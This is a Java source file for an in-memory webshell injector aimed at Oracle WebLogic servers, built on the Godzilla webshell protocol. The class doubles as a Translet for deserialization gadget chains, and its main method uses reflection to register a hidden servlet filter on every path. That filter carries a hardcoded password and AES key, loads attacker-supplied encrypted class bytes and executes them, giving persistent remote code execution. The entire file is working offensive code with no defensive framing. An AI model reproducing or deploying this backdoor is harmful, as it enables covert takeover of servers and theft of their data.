import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.Translet;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import weblogic.management.runtime.ApplicationRuntimeMBean;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.t3.srvr.ServerRuntime;

public class InjectWeblogicGodzilla4Filter extends ClassLoader implements Filter, Translet {
    public InjectWeblogicGodzilla4Filter() {
    }

    public InjectWeblogicGodzilla4Filter(ClassLoader z) {
        super(z);
    }

    public Class Q(byte[] cb) {
        return this.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec("3c6e0b8a9c15224a".getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
            value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String pass = "hackfun1024";
        String xc = "3c6e0b8a9c15224a";
        String md5 = md5(pass + xc);

        try {
            HttpServletRequest request = (HttpServletRequest)servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();
            byte[] data = base64Decode(request.getParameter(pass));
            data = this.x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new InjectWeblogicGodzilla4Filter(this.getClass().getClassLoader())).Q(data));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class)session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(request);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
            }
        } catch (Exception var13) {
            filterChain.doFilter(servletRequest, servletResponse);
            var13.printStackTrace();
        }

    }

    public void destroy() {
    }

    public static void main(String[] args) {
        try {
            WebAppServletContext webAppServletContext = null;
            Method m = Class.forName("weblogic.t3.srvr.ServerRuntime").getDeclaredMethod("theOne");
            m.setAccessible(true);
            ServerRuntime serverRuntime = (ServerRuntime)m.invoke((Object)null);
            List<WebAppServletContext> list = new ArrayList();
            ApplicationRuntimeMBean[] arr$ = serverRuntime.getApplicationRuntimes();
            int len$ = arr$.length;

            Object key;
            Field cachedClasses;
            for(int i = 0; i < len$; ++i) {
                ApplicationRuntimeMBean applicationRuntime = arr$[i];
                if (applicationRuntime.getApplicationName().equals("bea_wls_internal")) {
                    cachedClasses = applicationRuntime.getClass().getSuperclass().getDeclaredField("children");
                    cachedClasses.setAccessible(true);
                    HashSet set = (HashSet)cachedClasses.get(applicationRuntime);
                    Iterator is = set.iterator();

                    while(is.hasNext()) {
                        key = is.next();
                        if (key.getClass().getName().equals("weblogic.servlet.internal.WebAppRuntimeMBeanImpl")) {
                            Field contextF = key.getClass().getDeclaredField("context");
                            contextF.setAccessible(true);
                            webAppServletContext = (WebAppServletContext)contextF.get(key);
                            list.add(webAppServletContext);
                        }
                    }
                }
            }

            if (webAppServletContext != null) {
                Field classLoader = webAppServletContext.getClass().getDeclaredField("classLoader");
                classLoader.setAccessible(true);
                ClassLoader classLoader1 = (ClassLoader)classLoader.get(webAppServletContext);
                cachedClasses = classLoader1.getClass().getDeclaredField("cachedClasses");
                cachedClasses.setAccessible(true);
                Object cachedClasses_map = cachedClasses.get(classLoader1);
                Method get = cachedClasses_map.getClass().getDeclaredMethod("get", Object.class);
                get.setAccessible(true);
                if (get.invoke(cachedClasses_map, "jspFilter") == null) {
                    Method put = cachedClasses_map.getClass().getMethod("put", Object.class, Object.class);
                    put.setAccessible(true);
                    put.invoke(cachedClasses_map, "jspFilter", InjectWeblogicGodzilla4Filter.class);
                    Field filterManager = webAppServletContext.getClass().getDeclaredField("filterManager");
                    filterManager.setAccessible(true);
                    key = filterManager.get(webAppServletContext);
                    Method registerFilter = key.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                    registerFilter.setAccessible(true);
                    registerFilter.invoke(key, "test", "jspFilter", new String[]{"/*"}, null, null, null);
                }
            }

            Method method = webAppServletContext.getClass().getDeclaredMethod("getRootTempDir");
            File var20 = (File)method.invoke(webAppServletContext);
        } catch (Exception var16) {
        }

    }

    public void transform(DOM document, SerializationHandler handler) throws TransletException {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    public Object addParameter(String name, Object value) {
        return null;
    }

    public void buildKeys(DOM document, DTMAxisIterator iterator, SerializationHandler handler, int root) throws TransletException {
    }

    public void addAuxiliaryClass(Class auxClass) {
    }

    public Class getAuxiliaryClass(String className) {
        return null;
    }

    public String[] getNamesArray() {
        return new String[0];
    }

    public String[] getUrisArray() {
        return new String[0];
    }

    public int[] getTypesArray() {
        return new int[0];
    }

    public String[] getNamespaceArray() {
        return new String[0];
    }

    @Override
    public boolean useServicesMechnism() {
        return false;
    }

    @Override
    public void setServicesMechnism(boolean flag) {

    }

    public boolean overrideDefaultParser() {
        return false;
    }

    public void setOverrideDefaultParser(boolean flag) {
    }
}
